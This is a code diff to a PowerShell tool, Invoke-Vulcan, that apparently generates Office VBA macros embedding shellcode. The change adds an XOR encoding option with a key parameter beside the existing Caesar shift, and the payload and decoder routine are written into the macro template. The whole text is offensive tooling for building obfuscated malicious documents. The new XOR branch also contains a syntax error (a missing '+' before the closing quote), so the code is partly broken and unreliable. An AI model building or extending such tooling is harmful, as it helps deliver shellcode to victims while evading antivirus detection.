@@ -45,7 +45,7 @@ function Invoke-Vulcan {
 
     [CmdletBinding(PositionalBinding = $False)]
     param(
-        [ValidateSet("caesar")]
+        [ValidateSet("caesar", "xor")]
         [string]
         $Decoder,
 
@@ -56,6 +56,9 @@ function Invoke-Vulcan {
         [ValidateRange(0, 255)]
         [int]
         $Shift,
+
+        [String]
+        $Key,
 
         [ValidateScript({ Test-Path -Path $_ -PathType Container })]
         [String]
@@ -151,12 +154,21 @@ function Create_MacroFromTemplate($Shift, $Decoder, $DecoderPath, $ShellCode, $T
 
     switch ($Decoder) {
         "caesar" {
-            Write-Verbose "[i] Adding the Caesar decoding routine"
+            Write-Verbose "[i] Adding the $Decoder decoding routine"
 
             Set-Content -Path $MacroOutput -Value (
                 Get-Content -Path $Template).Replace(
                 "PAYLOAD", "Array(" + $PayloadArray + ')' + 
                 "`r`n" + "`r`n" + "`t" + "kUG HoR, " + $Shift)
+            Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
+        }
+        "xor" {
+            Write-Verbose "[i] Adding the $Decoder decoding routine"
+
+            Set-Content -Path $MacroOutput -Value (
+                Get-Content -Path $Template).Replace(
+                "PAYLOAD", "Array(" + $PayloadArray + ')' + 
+                "`r`n" + "`r`n" + "`t" + "kUG HoR, " + '"' + $Key '"')
             Add-Content -Path $MacroOutput -Value (Get-Content -Path $DecoderPath)
         }
         Default {
